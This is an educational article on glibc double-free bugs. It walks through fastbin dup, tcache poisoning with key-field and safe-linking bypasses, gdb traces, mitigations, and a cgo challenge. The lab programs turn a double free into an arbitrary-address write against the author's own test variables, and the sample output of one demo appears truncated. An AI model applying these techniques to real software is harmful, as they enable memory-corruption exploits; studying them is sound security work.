Double Free

Free list corruption, tcache poisoning, fastbin dup, glibc detection bypass - freeing the same chunk twice and how it leads to arbitrary-write primitives.

Overview

A double free is a heap corruption bug: the program returns the same chunk to the allocator twice. The second free() links an already-freed chunk into a free list again and creates a cycle, so later malloc() calls hand the same memory to two callers. Once an attacker controls the overwritten forward pointer, the allocator can be steered to return an arbitrary address, turning the bug into a write-what-where primitive. This article follows the glibc tcache and fastbin internals, the detection checks added across glibc versions, and the standard bypasses. After reading it you can trigger, observe, and exploit a double free in a controlled lab.

Definition

A double free occurs when free() is called on the same pointer more than once. The first free() places the chunk on a free list (tcache, fastbin, or regular bin). The second free() inserts the already-free chunk into the same list again. This creates a cycle in the free list - the same chunk appears twice. Subsequent malloc() calls return the same memory multiple times, creating aliased allocations. 

free(A)    -> free list: A -> ...
free(A)    -> free list: A -> A -> ...   (cycle, A appears twice)
malloc(N)  -> returns A
malloc(N)  -> returns A again          (same address, different "allocation")

The result: two logically independent pointers reference the same physical memory. Writing through one pointer corrupts data visible through the other. When the corrupted data overlaps free-list metadata (fd/bk pointers in the freed chunk's user-data area), the next malloc() can return an arbitrary attacker-chosen address.

The Free List as a Data Structure

Each freed chunk stores its free-list linkage in the first 8-16 bytes of its user-data area (the same memory the application used before freeing). glibc uses different structures for different bin types:

tcache (thread-local cache, glibc 2.26+)

typedef struct tcache_entry {
    struct tcache_entry *next;   // singly-linked list
    struct tcache_perthread_struct *key;  // pointer to tcache struct (detection)
} tcache_entry;

next (also called fd ) occupies the first 8 bytes of the user-data area. key occupies bytes 8-15 and stores a pointer back to tcache_perthread_struct - this is the double-free detection mechanism (see below).

fastbin (size 0x20-0x80)

struct malloc_chunk {
    size_t prev_size;    // reuse of previous chunk's last word (when prev is free)
    size_t size;         // chunk size including header, | PREV_INUSE flag
    struct malloc_chunk *fd;  // forward pointer (singly-linked)
    // bk in fastbins is unused
};

smallbin/largebin (doubly-linked)

struct malloc_chunk {
    size_t prev_size;
    size_t size;
    struct malloc_chunk *fd;  // forward
    struct malloc_chunk *bk;  // backward
};

In all cases, the user-data area overlaps with the linkage pointers. This is the key to exploitation: if an attacker can control data in a freed chunk, they control the free-list link.

glibc Double-Free Detection

glibc has evolved countermeasures against naive double frees:

1. Fastbin top check (ancient). If free() receives a pointer that exactly matches the top of the fastbin free list for that size, glibc detects the immediate double free and aborts: 

// glibc/malloc/malloc.c - _int_free()
if (__builtin_expect(old == p, 0))
    malloc_printerr("double free or corruption (fasttop)");

Where old is the current head of the fastbin and p is the chunk being freed. This catches free(A); free(A); but not free(A); free(B); free(A); .

2. tcache key check (glibc 2.29+). The key field in tcache_entry stores a pointer to tcache_perthread_struct . Before inserting into tcache, glibc checks whether the chunk's key field already holds this pointer - indicating the chunk is already in tcache: 

if (__glibc_unlikely(e->key == tcache))
    // walk tcache list to check if this entry is already present
    for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next)
        if (tmp == e)
            malloc_printerr("free(): double free detected in tcache 2");

This catches most tcache double frees but has a bypass: if you can overwrite the key field (bytes 8-15) between the two frees, the check passes. This requires a use-after-free write to modify the freed chunk's key.

3. Safe linking (glibc 2.32+). The next (fd) pointer in tcache and fastbin entries is "mangled" via XOR with the address of the chunk's location in the free list, shifted right by 12 bits: 

#define PROTECT_PTR(pos, ptr) \
    ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))

#define REVEAL_PTR(ptr)  PROTECT_PTR(&ptr, ptr)

This makes tcache poisoning harder - an attacker cannot simply write a target address as the fd pointer without knowing the pos >> 12 value to XOR against.

The Classic Bypass: free-A free-B free-A

The simplest double-free trick avoids the consecutive-free check by interleaving the free of a different chunk. It defeats the fastbin top check, which only compares against the head of the list. It does not defeat the tcache key check, which walks the entire tcache list, so on glibc 2.29 and newer the interleaved free still aborts unless the chunk's key field has been overwritten, or the chunks land in a fastbin (the tcache bin is full, or tcache is disabled): 

char *a = malloc(32);
char *b = malloc(32);

free(a);    // a in free list: a ->
free(b);    // b in free list: b -> a ->
free(a);    // a in free list again: a -> b -> a ->   (cycle!)

After this sequence:

char *p1 = malloc(32);  // returns a, free list: b -> a ->
char *p2 = malloc(32);  // returns b, free list: a ->
char *p3 = malloc(32);  // returns a AGAIN, free list: a -> ... (cycle persists)

// p1 == p3 - both point to the same chunk
// Write through p3 to corrupt p1's contents

Here is the full working demonstration:

/* double_free_demo.c */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    setbuf(stdout, NULL);

    char *a = malloc(0x20);
    char *b = malloc(0x20);
    char *c = malloc(0x20);  /* barrier to prevent top chunk coalescing */

    printf("[*] a = %p\n", a);
    printf("[*] b = %p\n", b);
    printf("[*] c = %p\n", c);

    strcpy(a, "ORIGINAL DATA IN A");
    printf("[*] a: %s\n", a);

    free(a);
    free(b);
    free(a);   /* double free: a already on free list */

    printf("[!] Double free completed\n");

    /* malloc returns a (head of free list) */
    char *p1 = malloc(0x20);
    printf("[*] p1 = %p (should be a)\n", p1);
    strcpy(p1, "DATA FROM ALLOC 1");

    char *p2 = malloc(0x20);
    printf("[*] p2 = %p (should be b)\n", p2);
    strcpy(p2, "DATA FROM ALLOC 2");

    char *p3 = malloc(0x20);
    printf("[*] p3 = %p (should be a again)\n", p3);

    /* p1 and p3 alias the same memory */
    printf("[*] via p1: %s\n", p1);
    printf("[*] via p3: %s\n", p3);

    strcpy(p3, "OVERWRITTEN VIA P3");
    printf("[*] via p1 after p3 write: %s\n", p1);

    return 0;
}

Compile and run. The GLIBC_TUNABLES assignment disables tcache so the chunks take the fastbin path, where the interleaved free only compares against the list head: 

gcc -g -o double_free_demo double_free_demo.c -no-pie
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./double_free_demo

# [*] b = 0x5555555596d0
# [*] c = 0x555555559b00
# [*] a: ORIGINAL DATA IN A
# [!] Double free completed
# [*] p1 = 0x5555555592a0 (should be a)
# [*] p2 = 0x5555555596d0 (should be b)
# [*] p3 = 0x5555555592a0 (should be a again)
# [*] via p1: DATA FROM ALLOC 2

Notice: immediately after the third malloc, p1 and p3 point to the same address. The data from "ALLOC 1" was overwritten by "ALLOC 2"'s metadata because the free list linkage used those bytes.

Without disabling tcache, the same program aborts on glibc 2.29 and newer at the third free with free(): double free detected in tcache 2 . The tcache key check walks the whole list, so the interleaved order does not hide the duplicate. The next section shows the tcache route.

Tcache Poisoning via Double Free

The real exploitation value of a double free is tcache poisoning - corrupting the fd pointer in a freed chunk so that a future malloc() returns an arbitrary address. This is a "write-what-where" primitive: whatever the attacker writes to the arbitrary address overwrites memory at that location.

Step-by-step tcache poisoning

1. double free A       ->  tcache: A -> A -> A -> ... (cycle)
2. malloc(N) -> returns A
     write target_addr to A->fd
     (A->fd occupies first 8 bytes of user data, which we control via ptr1)
     tcache: A -> target_addr -> ???

3. malloc(N) -> returns A again (second copy from cycle)
     tcache: target_addr -> ???

4. malloc(N) -> returns target_addr !!
     Now we can write to any address.

Full code with tcache poisoning:

/* tcache_poisoning.c */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned long target = 0xDEADBEEFCAFEBABE;

int main() {
    setbuf(stdout, NULL);

    printf("[*] target @ %p = 0x%lx\n", &target, target);

    /* Disable safe-linking for clarity if glibc < 2.32; otherwise
       we need to XOR against (chunk_addr >> 12). Below handles both. */

    size_t *a = malloc(128);
    size_t *b = malloc(128);
    void *barrier = malloc(128);  /* prevent top chunk coalescing */

    free(a);
    /* glibc >= 2.29: the tcache double-free check reads chunk->key.
       Clearing it (a use-after-free write) makes the third free pass. */
    *(size_t *)((char *)a + 8) = 0;
    free(b);
    free(a);   /* double free - tcache holds: a -> b -> a */

    /* malloc 1: get a, write target address as fd */
    size_t *p1 = malloc(128);

    #if __GLIBC_PREREQ(2, 32)
        /* safe-linking: fd = target ^ (chunk_addr >> 12) */
        #define PROTECT_PTR(pos, ptr) \
            ((size_t)(((size_t)(pos) >> 12) ^ ((size_t)(ptr))))
        *p1 = PROTECT_PTR(p1, &target);
    #else
        *p1 = (size_t)&target;
    #endif

    /* malloc 2: get b (skip over b in the cycle) */
    void *p2 = malloc(128);

    /* malloc 3: get a again (the poisoned entry) */
    void *p3 = malloc(128);

    /* malloc 4: tcache returns target_addr! */
    void *fake_chunk = malloc(128);

    printf("[*] fake_chunk = %p\n", fake_chunk);
    printf("[*] target = %p\n", &target);

    if (fake_chunk == &target) {
        printf("[+] malloc returned target address!\n");
        /* Now write to fake_chunk -> writes to &target */
        *(size_t *)fake_chunk = 0x4141414142424242;
        printf("[*] target now = 0x%lx\n", target);
    } else {
        printf("[-] misalignment, fake_chunk != &target\n");
    }

    return 0;
}

Safe-Linking (glibc 2.32+)

Safe-linking XORs the forward pointer in tcache and fastbin entries with the chunk's own position in the free list. The key insight is that an attacker who can write a fd pointer through heap corruption typically does not know the heap address - the XOR masks the target. 

static __always_inline void
tcache_put(mchunkptr chunk, size_t tc_idx) {
    tcache_entry *e = (tcache_entry *) chunk2mem(chunk);
    e->key = tcache_key;

    /* PROTECT_PTR: pos is &tcache->entries[tc_idx], ptr is the old head */
    e->next = PROTECT_PTR(&e->next, tcache->entries[tc_idx]);
    tcache->entries[tc_idx] = e;
    ++(tcache->counts[tc_idx]);
}

static __always_inline void *
tcache_get(size_t tc_idx) {
    tcache_entry *e = tcache->entries[tc_idx];
    tcache->entries[tc_idx] = REVEAL_PTR(e->next);
    --(tcache->counts[tc_idx]);
    e->key = 0;
    return (void *) e;
}

To bypass safe-linking, an attacker needs a heap address leak. If a UAF or info leak reveals the heap base, the attacker can compute PROTECT_PTR(result, target) and write the mangled value as fd. Safe-linking is not a cryptographic defense - it's a one-round deterrent that raises the bar from "write a raw address" to "leak a heap pointer, then compute XOR, then write."

Bypassing the tcache key Check

glibc 2.29 introduced the key field check. To bypass it when attacking tcache: 

char *a = malloc(32);
free(a);           // a->key = &tcache_perthread_struct
// UAF write to a:
*(size_t *)(a + 8) = 0x41414141;  // overwrite key, now != &tcache
free(a);           // key check passes - double free succeeds

This requires a UAF write primitive, which is one reason UAF and double free are often chained: UAF provides the write to corrupt metadata, double free leverages the corruption to gain arbitrary allocation.

malloc_consolidate() and Its Effect

When a request for a large chunk (roughly >= 0x400 bytes) reaches malloc() , or when a free() releases a chunk larger than the fastbin consolidation threshold (64 KiB), glibc calls malloc_consolidate() . It moves every fastbin chunk into the unsorted bin and coalesces adjacent free chunks.

This disrupts fastbin-based double-free exploitation: the coalesced chunk may end up with a different size and bin classification, and the simple singly-linked fastbin list is destroyed.

Timing matters: exploit before the next large malloc triggers consolidation.

void *small = malloc(0x30);
free(small);           // fastbin[0x40]: small ->
free(small);           // double free in fastbin
// ... exploit fastbin dup ...
void *large = malloc(0x1000);  // triggers malloc_consolidate()
// fastbin entries moved to unsorted bin - double free cycle broken

Unsorted Bin Double Free

Doubly-linked bins (unsorted, small, large) have a different double-free detection:

if (__glibc_unlikely(fd->bk != p || bk->fd != p))
    malloc_printerr("free(): corrupted unsorted chunks");

When inserting into a doubly-linked list, glibc checks that the neighboring chunks' bk/fd point back to the chunk being inserted. A double free in these bins corrupts the doubly-linked pointers (fd points forward, bk points backward), and the consistency check catches a naive double free.

Bypassing this requires forging the bk/fd pointers of neighboring chunks - an advanced technique called "unsorted bin attack" that requires a heap write primitive first.

gdb -q ./tcache_poisoning

(gdb) r

# Examine tcache before any frees:
(gdb) p *tcache
# entries[0..63] all NULL, counts[0..63] all 0

# After free(a):
(gdb) p tcache->entries[7]   # idx 7 for 128-byte chunks
$1 = (tcache_entry *) 0x5555555592a0
(gdb) p tcache->counts[7]
$2 = 1 '\001'

# After free(b):
(gdb) p tcache->entries[7]
$3 = (tcache_entry *) 0x555555559700   # b (head), fd -> a
(gdb) p tcache->counts[7]
$4 = 2 '\002'

# After free(a) again (double free):
(gdb) p tcache->entries[7]
$5 = (tcache_entry *) 0x5555555592a0   # a again (head), fd -> b
(gdb) x/gx 0x5555555592a0
0x5555555592a0: 0x0000555555559700     # a->fd = b
(gdb) x/gx 0x555555559700
0x555555559700: 0x00005555555592a0     # b->fd = a  (CYCLE)
(gdb) p tcache->counts[7]
$6 = 3 '\003'    # count incremented to 3 - but only 2 unique chunks exist!

The counts field is also important: each malloc() decrements it. With 3 entries in the list for 2 actual chunks, after 4 mallocs the count underflows (or reaches 0 before the list is empty), which can be exploited for further manipulation.

Relationship to UAF

A UAF that provides a write-after-free can be used to perform a double-free equivalent: write to the freed chunk's key field, then call free() again. Conversely, a double free that makes malloc return the same address twice gives you two pointers to the same memory - exactly the aliasing setup needed for a UAF-like primitive on an allocated chunk.

The two bug classes are operational siblings:

From To Mechanism
UAF Double free UAF write overwrites freed chunk key -> free() again bypasses detection
Double free UAF Two mallocs return same chunk -> two live pointers to same memory

Prevention and Mitigation

Never call free() on an already-freed pointer. Track allocation state: 

if (ptr) {
    free(ptr);
    ptr = NULL;  // prevents accidental second free
}

Static analysis. Check for free(p) followed by another free(p) on any path. More subtly: function A frees p and returns, function B receives p and frees it - ownership confusion.

AddressSanitizer.

gcc -g -fsanitize=address -o df_asan double_free_demo.c
./df_asan

# ==12345==ERROR: AddressSanitizer: attempting double-free
#   #0 0x... in free
#   #1 0x... in main double_free_demo.c:19

glibc heap consistency checks. glibc's runtime checks catch many double frees (fastbin top, tcache key, unsorted bin bk/fd consistency) but are not exhaustive. They exist to fail-safe on corruption, not to prevent it.

Mimalloc / jemalloc hardening. Alternative allocators provide stronger double-free detection: delayed reuse, canary values in freed chunks, separate metadata from user data so fd/bk pointers cannot be overwritten by a buffer overflow into adjacent allocations.

Rust. The ownership model makes double free impossible: the compiler inserts exactly one drop call per value. The value is moved, not copied - after drop , the compiler won't let you reference it again.

Summary

A double free inserts the same chunk into the free list twice, creating a cycle. This cycle causes malloc() to return the same address to multiple callers - aliased allocations. When the attacker controls the fd/bk pointer of the freed chunk before the next allocation, they redirect the free list to an arbitrary address. Subsequent malloc() returns that address, yielding a write primitive. glibc has layered detections (fastbin top check, tcache key, safe-linking)

  • each has bypasses if combined with an info leak or a UAF write primitive.

Challenge

Trigger glibc's double-free detection from Go with cgo. Allocate a buffer with C.malloc and free it twice. Run the snippet first with the key write commented out: the process aborts with free(): double free detected in tcache 2 . Enable the key write and the same call sequence instead hands the same chunk out twice. 

package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"fmt"
	"unsafe"
)

func main() {
	p := C.malloc(32)

	// First free: glibc stores the tcache pointer in the key word.
	C.free(p)

	// Clear the key to pass the glibc >= 2.29 double-free check.
	*(*uintptr)(unsafe.Pointer(uintptr(p) + 8)) = 0

	// Second free: succeeds only because the key was overwritten.
	C.free(p)

	q := C.malloc(32)
	fmt.Printf("p = %p, q = %p, aliased = %v\n", p, q, p == q)
}

Build with go run main.go (cgo needs a C compiler). Explain why p and q alias, then extend the program to overwrite the freed chunk's forward pointer so the next malloc returns a chosen address.
